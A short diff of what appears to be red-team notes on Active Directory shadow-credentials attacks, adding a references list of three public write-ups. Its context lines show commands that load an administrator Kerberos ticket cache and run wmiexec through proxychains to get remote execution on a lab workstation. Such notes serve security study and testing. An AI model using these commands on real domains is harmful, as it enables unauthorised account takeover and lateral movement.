@@ -63,3 +63,10 @@
   export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache
   proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab
   ```
+
+
+## References
+
+* [Shadow Credentials: Workstation Takeover Edition - Matthew Creel](https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition)
+* [Shadow Credentials - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
+* [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
